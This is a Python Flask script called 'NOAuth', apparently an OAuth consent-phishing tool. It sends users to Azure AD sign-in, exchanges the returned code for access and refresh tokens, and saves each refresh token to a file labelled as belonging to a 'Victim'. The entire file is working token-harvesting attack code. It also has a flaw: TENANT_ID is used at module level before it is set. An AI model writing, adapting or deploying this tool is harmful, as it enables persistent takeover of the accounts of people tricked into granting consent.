import sys

from flask import Flask, redirect, request, session, url_for
import requests
import argparse

app = Flask(__name__)

# Azure AD OAuth settings
REDIRECT_URI = 'http://localhost:5000/callback'  # Redirect URI

AUTHORITY = f'https://login.microsoftonline.com/{TENANT_ID}'
AUTHORIZATION_URL = f'{AUTHORITY}/oauth2/v2.0/authorize'
TOKEN_URL = f'{AUTHORITY}/oauth2/v2.0/token'


@app.route('/')
def home():
    return 'Welcome to NOAuth!'


@app.route('/login')
def login():
    # Redirect the user to Azure AD for authorization
    return redirect(
        f'{AUTHORIZATION_URL}?response_type=code&client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_mode=query&scope=openid profile email offline_access')


@app.route('/callback')
def callback():
    # Azure AD will redirect here with a code
    code = request.args.get('code')
    if not code:
        return 'Authorization code not found.', 400

    # Exchange the authorization code for an access token and refresh token
    response = requests.post(TOKEN_URL, data={
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'grant_type': 'authorization_code',
        'scope': 'openid profile email'
    }, headers={'Content-Type': 'application/x-www-form-urlencoded'})

    # Get the access token and refresh token from the response
    token_data = response.json()
    access_token = token_data.get('access_token')
    refresh_token = token_data.get('refresh_token')

    if not access_token or not refresh_token:
        return 'Access or refresh token not found.', 400

    # Save tokens and user info to session
    session['access_token'] = access_token
    session['refresh_token'] = refresh_token

    # Write refresh token and user info to a file
    with open('PATH', 'w') as f:
        f.write(f'Refresh Token For Victim In Tenant {TENANT_ID}: {refresh_token}\n')

    return f'Hello! Your information has been saved. <a href="/logout">Logout</a>'


@app.route('/logout')
def logout():
    # Remove the access and refresh tokens from the session
    session.pop('access_token', None)
    session.pop('refresh_token', None)
    return redirect(url_for('home'))


def main():
    parser = argparse.ArgumentParser(description='NOAuth Application')
    parser.add_argument('client_id', help='Azure AD client ID')
    parser.add_argument('client_secret', help='Azure AD client secret')
    parser.add_argument('tenant_id', help='Azure AD tenant ID')

    args = parser.parse_args()

    global CLIENT_ID, CLIENT_SECRET, TENANT_ID
    CLIENT_ID = args.client_id
    CLIENT_SECRET = args.client_secret
    TENANT_ID = args.tenant_id

    if not CLIENT_ID or not CLIENT_SECRET or not TENANT_ID:
        parser.print_help()
        sys.exit(1)

    app.run(debug=True)

if __name__ == '__main__':
    main()
